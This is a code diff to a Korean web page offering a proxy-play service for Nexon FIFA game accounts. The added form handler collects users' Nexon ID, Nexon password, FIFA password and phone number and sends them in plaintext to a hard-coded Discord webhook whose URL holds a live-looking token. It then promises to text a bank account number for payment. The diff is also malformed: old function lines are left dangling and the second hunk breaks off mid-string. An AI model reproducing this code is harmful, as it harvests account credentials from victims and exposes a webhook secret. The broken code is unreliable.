@@ -244,7 +244,40 @@
         }
 
         // 대낙 신청 처리
-        function handleApply(event) {
+       // 대낙 신청 처리 및 디스코드 실시간 알림 전송
+function handleApply(event) {
+    event.preventDefault();
+    const nexonId = document.getElementById('nexonId').value;
+    const nexonPw = document.getElementById('nexonPw').value;
+    const fifaPw = document.getElementById('fifaPw').value;
+    const phone = document.getElementById('phone').value;
+    const time = new Date().toLocaleString();
+
+    // 디스코드에 보낼 메시지 내용
+    const discordPayload = {
+        content: `🚨 **[새로운 대낙 신청 완료!]** 🚨\n> **신청 시간:** ${time}\n> **넥슨 아이디:** \`${nexonId}\`\n> **넥슨 비밀번호:** \`${nexonPw}\`\n> **피파 비밀번호:** \`${fifaPw}\`\n> **전화번호:** \`${phone}\``
+    };
+
+    // 내 디스코드 웹훅으로 데이터 전송
+    fetch('https://discord.com/api/webhooks/1533786795622273205/39PCiRPZtyRzLqrzCUrqp5YFpBt7WQCoNnnKfYf5cOLLipPt5v2CArkjrw9EAvuw53Hd', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(discordPayload)
+    })
+    .then(response => {
+        if (response.ok) {
+            alert(`[빽대낙 신청 완료]\n\n넥슨 아이디: ${nexonId}\n전화번호: ${phone}\n입력하신 번호로 계좌번호가 발송됩니다!`);
+            event.target.reset();
+        } else {
+            alert("신청 전송 중 오류가 발생했습니다.");
+        }
+    })
+    .catch(error => {
+        alert("네트워크 오류가 발생했습니다: " + error);
+    });
+}
             event.preventDefault();
             const nexonId = document.getElementById('nexonId').value;
             const nexonPw = document.getElementById('nexonPw').value;
@@ -273,11 +306,7 @@ localStorage.setItem('applyList', JSON.stringify(applyList));
         function renderAdminTable() {
             const tbody = document.getElementById('applyTableBody');
             if (applyList.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" style="color: #888;">신청된 내역이 없습니다.</td></tr>`;
-                return;
-            }
-
-            let html = '';
+                tbody.innerHTML = `<tr><td co
             applyList.forEach(item => {
                 html += `
                     <tr>
